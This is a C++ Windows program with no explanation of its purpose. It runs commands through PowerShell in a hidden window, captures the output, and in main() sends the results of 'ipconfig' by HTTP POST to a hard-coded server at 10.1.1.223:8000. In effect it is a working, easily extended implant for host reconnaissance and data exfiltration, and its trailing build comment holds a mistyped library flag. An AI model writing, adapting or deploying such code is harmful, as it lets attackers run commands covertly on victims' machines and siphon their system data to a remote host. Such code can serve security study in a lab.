#include <windows.h>
#include <iostream>
#include <string>
#include <sstream>
#include <wininet.h>

#pragma comment(lib, "wininet.lib")

std::string execCommand(const std::string& command) {
  std::string result;
  HANDLE hPipeRead, hPipeWrite;

  SECURITY_ATTRIBUTES saAttr = {sizeof(SECURITY_ATTRIBUTES)};

  // Pipe handles are inherited by child process.
  saAttr.bInheritHandle = TRUE;
  saAttr.lpSecurityDescriptor = NULL;

  // Create a pipe to get the output of the command.
  if (!CreatePipe(&hPipeRead, &hPipeWrite, &saAttr, 0)) {
    return "CreatePipe failed.";
  }

  // Ensure the read handle to the pipe is not inherited.
  SetHandleInformation(hPipeRead, HANDLE_FLAG_INHERIT, 0);

  // Create the child process.
  PROCESS_INFORMATION pi;
  STARTUPINFOA si = {sizeof(STARTUPINFOA)};
  si.dwFlags = STARTF_USESTDHANDLES;
  si.hStdOutput = hPipeWrite;
  si.hStdError = hPipeWrite;
  si.hStdInput = NULL;

  // Use PowerShell to execute the command.
  std::string cmd = "powershell -Command \"" + command + "\"";

  if (!CreateProcessA(NULL, (LPSTR)cmd.c_str(), NULL, NULL, TRUE,
                      CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
    CloseHandle(hPipeWrite);
    CloseHandle(hPipeRead);
    return "CreateProcess failed.";
  }

  // Close the write end of the pipe before reading from the read end.
  CloseHandle(hPipeWrite);

  // Read output from the child process.
  CHAR buffer[4096];
  DWORD bytesRead;
  while (ReadFile(hPipeRead, buffer, sizeof(buffer) - 1, &bytesRead, NULL) &&
         bytesRead != 0) {
    buffer[bytesRead] = '\0';
    result += buffer;
  }

  // Cleanup.
  CloseHandle(hPipeRead);
  CloseHandle(pi.hProcess);
  CloseHandle(pi.hThread);

  return result;
}

void postToServer(const std::string& server, const std::string& port,
                  const std::string& target, const std::string& message) {
  HINTERNET hSession =
      InternetOpenA("PostRequest", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
  if (!hSession) {
    std::cerr << "InternetOpenA failed." << std::endl;
    return;
  }

  HINTERNET hConnect =
      InternetConnectA(hSession, server.c_str(), std::stoi(port), NULL, NULL,
                       INTERNET_SERVICE_HTTP, 0, 0);
  if (!hConnect) {
    std::cerr << "InternetConnectA failed." << std::endl;
    InternetCloseHandle(hSession);
    return;
  }

  HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", target.c_str(), NULL,
                                        NULL, NULL, 0, 0);
  if (!hRequest) {
    std::cerr << "HttpOpenRequestA failed." << std::endl;
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hSession);
    return;
  }

  std::string headers = "Content-Type: text/plain\r\n";
  if (!HttpSendRequestA(hRequest, headers.c_str(), headers.length(),
                        (LPVOID)message.c_str(), message.length())) {
    std::cerr << "HttpSendRequestA failed." << std::endl;
  } else {
    std::cout << "Request sent successfully." << std::endl;
  }

  InternetCloseHandle(hRequest);
  InternetCloseHandle(hConnect);
  InternetCloseHandle(hSession);
}

int main() {
  try {
    std::string result = execCommand("ipconfig");
    postToServer("10.1.1.223", "8000", "/", result);
  } catch (const std::exception& e) {
    std::cerr << "Exception: " << e.what() << "\n";
  }
  return 0;
}

//  g++ -o pp main.cpp -lwinine
